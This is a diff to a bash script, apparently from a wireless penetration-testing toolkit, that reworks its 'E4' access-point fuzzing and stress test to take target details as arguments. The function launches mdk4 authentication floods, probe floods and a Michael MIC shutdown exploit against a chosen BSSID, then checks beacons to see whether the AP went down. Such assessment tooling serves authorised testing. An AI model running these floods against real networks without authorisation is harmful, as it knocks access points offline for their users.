@@ -41,8 +41,33 @@ set -uo pipefail
 #===============================================================================
 
 run_e4() {
+    local interface=""
+    local bssid="${GUEST_BSSID:-}"
+    local ssid="${GUEST_SSID:-}"
+    local channel="${GUEST_CHANNEL:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --interface) interface="$2"; shift 2 ;;
+            --bssid) bssid="$2"; shift 2 ;;
+            --ssid) ssid="$2"; shift 2 ;;
+            --channel) channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
+    # Fallbacks to globals
+    interface="${interface:-${WIFI_INTERFACE:-}}"
+    bssid="${bssid:-${GUEST_BSSID:-}}"
+    ssid="${ssid:-${GUEST_SSID:-}}"
+    channel="${channel:-${GUEST_CHANNEL:-}}"
+    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
+
     local total_steps=7
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/e4"
+    local evidence_prefix="${evidence_dir}/e4"
 
     #--- Step 1: Verify tools ---
     log_step 1 $total_steps "Verifying tools"
@@ -61,15 +86,18 @@ run_e4() {
         return 1
     fi
 
-    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
+    if [[ -z "$ssid" || -z "$bssid" ]]; then
         log_warn "Target SSID/BSSID not set."
         if ! select_target_network; then
             log_error "No target selected. Run A1 first or enter manually."
             return 1
         fi
+        ssid="${GUEST_SSID:-}"
+        bssid="${GUEST_BSSID:-}"
+        channel="${GUEST_CHANNEL:-}"
     fi
 
-    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID}) CH ${GUEST_CHANNEL:-auto}"
+    log_success "Target: ${ssid} (${bssid}) CH ${channel:-auto}"
 
     #--- Warning banner ---
     echo ""
@@ -106,7 +134,7 @@ run_e4() {
         echo "============================================================"
         echo "  E4: Wireless Fuzzing & AP Stress Test"
         echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
-        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
+        echo "  Target: ${ssid} (${bssid})"
         echo "============================================================"
         echo ""
     } > "$findings_file"
@@ -122,11 +150,12 @@ run_e4() {
     log_step 2 $total_steps "Establishing AP health baseline"
     update_tc_progress 2 $total_steps "Baseline"
 
+    WIFI_INTERFACE="$interface"
     enable_monitor_mode || return 1
     local mon_iface="${MONITOR_INTERFACE}"
 
-    if [[ -n "${GUEST_CHANNEL:-}" ]]; then
-        iw dev "$mon_iface" set channel "$GUEST_CHANNEL" 2>/dev/null || true
+    if [[ -n "$channel" ]]; then
+        run_fg iw dev "$mon_iface" set channel "$channel" 2>/dev/null || true
     fi
 
     {
@@ -139,8 +168,8 @@ run_e4() {
 
     # Count beacons per 10 seconds as baseline
     local baseline_beacons
-    baseline_beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 1000 \
-        "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
+    baseline_beacons=$(timeout 10 run_fg tcpdump -i "$mon_iface" -c 1000 \
+        "type mgt subtype beacon and ether src ${bssid}" \
         2>/dev/null | wc -l) || true
     baseline_beacons=${baseline_beacons:-0}
 
@@ -149,7 +178,7 @@ run_e4() {
 
     # Start continuous monitoring
     spawn_bg "e4_tcpdump" "tcpdump" -i "$mon_iface" -w "$fuzz_pcap" \
-        "ether src ${GUEST_BSSID} or ether dst ${GUEST_BSSID}"
+        "ether src ${bssid} or ether dst ${bssid}"
 
     check_abort || return 1
 
@@ -157,8 +186,8 @@ run_e4() {
     _check_ap_alive() {
         local test_name="$1"
         local beacons
-        beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 100 \
-            "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
+        beacons=$(timeout 10 run_fg tcpdump -i "$mon_iface" -c 100 \
+            "type mgt subtype beacon and ether src ${bssid}" \
             2>/dev/null | wc -l) || true
         beacons=${beacons:-0}
 
@@ -180,7 +209,7 @@ run_e4() {
 
     if [[ "$has_mdk4" == "true" ]]; then
         log_info "Sending auth flood for 15 seconds..."
-        spawn_bg "e4_mdk4_auth" "mdk4" "$mon_iface" a -a "${GUEST_BSSID}"
+        spawn_bg "e4_mdk4_auth" "mdk4" "$mon_iface" a -a "${bssid}"
         sleep 15
         stop_process "e4_mdk4_auth"
         ((tests_run++))
@@ -207,7 +236,7 @@ run_e4() {
     if [[ "$has_mdk4" == "true" ]]; then
         # Probe flood — send thousands of probe requests
         log_info "Sending probe flood for 15 seconds..."
-        spawn_bg "e4_mdk4_probe" "mdk4" "$mon_iface" p -t "${GUEST_BSSID}" -c "${GUEST_CHANNEL:-1}"
+        spawn_bg "e4_mdk4_probe" "mdk4" "$mon_iface" p -t "${bssid}" -c "${channel:-1}"
         sleep 15
         stop_process "e4_mdk4_probe"
         ((tests_run++))
@@ -233,7 +262,7 @@ run_e4() {
     if [[ "$has_mdk4" == "true" ]]; then
         # Michael shutdown — exploits TKIP MIC countermeasure
         log_info "Sending Michael MIC exploit for 10 seconds..."
-        spawn_bg "e4_mdk4_mic" "mdk4" "$mon_iface" m -t "${GUEST_BSSID}"
+        spawn_bg "e4_mdk4_mic" "mdk4" "$mon_iface" m -t "${bssid}"
         sleep 10
         stop_process "e4_mdk4_mic"
         ((tests_run++))
@@ -277,7 +306,7 @@ run_e4() {
     sleep 10
     local post_beacons
     post_beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 1000 \
-        "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
+        "type mgt subtype beacon and ether src ${bssid}" \
         2>/dev/null | wc -l) || true
     post_beacons=${post_beacons:-0}
 
@@ -297,7 +326,7 @@ run_e4() {
 
         local reboot_beacons
         reboot_beacons=$(timeout 10 run_fg "tcpdump" -i "$mon_iface" -c 100 \
-            "type mgt subtype beacon and ether src ${GUEST_BSSID}" \
+            "type mgt subtype beacon and ether src ${bssid}" \
             2>/dev/null | wc -l) || true
 
         if [[ ${reboot_beacons:-0} -gt 0 ]]; then
